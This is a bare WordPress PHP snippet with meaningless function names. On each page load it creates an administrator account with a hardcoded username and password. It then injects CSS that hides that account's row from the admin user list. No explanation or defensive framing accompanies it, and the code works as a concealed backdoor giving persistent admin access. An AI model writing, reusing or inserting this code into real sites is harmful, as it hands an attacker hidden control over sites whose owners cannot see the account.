<?php
function dsdfgrtrthfd() {
    $username = 'username';
    $password = 'StrongPassword123!';
    $email    = 'wp@example.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);

        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            update_option('hidden_admin_id', $user_id);

        } else {
            error_log('Error: ' . $user_id->get_error_message());
        }
    }
}
add_action('init', 'dsdfgrtrthfd');


function fghfghdf() {
    $user_id = get_option('hidden_admin_id');
    if ($user_id) {
        echo "<style> tr#user-$user_id { display:none !important; } </style>";
    }
}
add_action('admin_head', 'fghfghdf');
?>
